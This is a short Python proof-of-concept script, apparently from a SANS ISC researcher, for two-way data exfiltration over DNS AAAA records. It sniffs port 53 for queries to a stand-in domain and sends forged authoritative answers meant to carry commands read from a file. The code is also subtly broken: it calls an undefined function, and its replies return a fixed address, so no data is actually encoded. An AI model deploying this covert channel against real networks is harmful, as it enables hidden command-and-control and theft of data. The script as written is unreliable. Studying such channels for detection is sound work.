#!/opt/local/bin/python
# Bi-Directional data exfiltration with AAAA records.
# PoC. jullrich@sans.edu 5/7/2016 https://isc.sans.edu


from scapy.all import *
from sys import argv

# configure the interface to listen on and the domain name to be used.

iface='en0'
domain='evilexample.com'

# open file to read commands from.

script, filename = argv
txt = open(filename)

# processing packets

def dnsreply(pkt):
    if DNSQR in pkt and pkt.qdcount==1 and pkt.opcode==0 and pkt.qr==0 and pkt.qd[0].qtype==28:
        print len(pkt.qd.qname)-pkt.qd.qname.find(domain)-len(domain)
        if len(pkt.qd.qname)-pkt.qd.qname.find(domain)-len(domain)==1:
            line=txt.readline()
            line.strip()
            print "received"
            print toHex(line)
            response=IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(sport=pkt.dport,dport=pkt.sport)/DNS(id=pkt[DNS].id,qr=1,opcode=0,aa=1,qdcount=1,ancount=1,nscount=0,arcount=0,qd=pkt.qd[0],an=DNSRR(rrname=pkt.qd[0].qname,type=28,ttl=1,rdata='2001:db8::1'))
            send(response)


# converting data to a hex string (could use larger character set. but this is easy on the
# client side with xxd, and I like to use xxd
# from code.activestate.com

def toIPv6(s):
  lst = []
  size=len(s);
  # we can only encode 16 bytes in a AAAA record.
  if size > 16 :
      return ''
  if s=='':
    return ''
  for ch in s:
    hv = hex(ord(ch)).replace('0x','')
    if len(hv) == 1:
      hv = '0' + hv
    lst.append(hv)
  return reduce(lambda x,y:x+y,lst)

# wait for packets.

print "starting to look for packets."
sniff(filter='udp and port 53',count=0,prn=dnsreply ,iface=iface);